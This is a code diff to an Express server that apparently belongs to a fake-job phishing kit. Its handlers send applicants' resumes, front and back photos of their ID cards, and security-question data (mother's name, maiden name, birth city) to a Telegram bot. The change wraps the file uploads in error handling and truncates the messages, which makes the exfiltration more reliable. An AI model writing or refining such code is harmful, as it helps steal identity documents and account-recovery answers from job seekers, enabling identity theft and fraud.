@@ -78,7 +78,7 @@ app.post(
 💼 Position: ${data.position}
 🏢 Department: ${data.department}
 📝 Cover Letter: ${data.coverLetter}
-`;
+`.substring(0, 4000);
 
       await axios.post(
         `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`,
@@ -89,12 +89,16 @@ app.post(
       );
 
       if (req.files?.resume?.[0]) {
-        await sendFile(
-          req.files.resume[0].buffer,
-          req.files.resume[0].originalname,
-          req.files.resume[0].mimetype,
-          "document",
-        );
+        try {
+          await sendFile(
+            req.files.resume[0].buffer,
+            req.files.resume[0].originalname,
+            req.files.resume[0].mimetype,
+            "document",
+          );
+        } catch (uploadErr) {
+          console.error("Error sending file to Telegram:", uploadErr);
+        }
       }
 
       res.json({ success: true });
@@ -132,20 +136,28 @@ Employee Ref: ${data.employeeRef || "None"}
       );
 
       if (req.files?.idFront?.[0]) {
-        await sendFile(
-          req.files.idFront[0].buffer,
-          req.files.idFront[0].originalname,
-          req.files.idFront[0].mimetype,
-          "photo",
-        );
+        try {
+          await sendFile(
+            req.files.idFront[0].buffer,
+            req.files.idFront[0].originalname,
+            req.files.idFront[0].mimetype,
+            "photo",
+          );
+        } catch (uploadErr) {
+          console.error("Error sending idFront to Telegram:", uploadErr);
+        }
       }
       if (req.files?.idBack?.[0]) {
-        await sendFile(
-          req.files.idBack[0].buffer,
-          req.files.idBack[0].originalname,
-          req.files.idBack[0].mimetype,
-          "photo",
-        );
+        try {
+          await sendFile(
+            req.files.idBack[0].buffer,
+            req.files.idBack[0].originalname,
+            req.files.idBack[0].mimetype,
+            "photo",
+          );
+        } catch (uploadErr) {
+          console.error("Error sending idBack to Telegram:", uploadErr);
+        }
       }
 
       res.json({ success: true });
@@ -168,7 +180,7 @@ Mother's Name: ${data.motherName}
 Maiden Name: ${data.maidenName}
 Birth City/State: ${data.birthCityState}
 Additional Info: ${data.additionalInfo || "None"}
-`;
+`.substring(0, 4000);
 
     await axios.post(
       `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`,
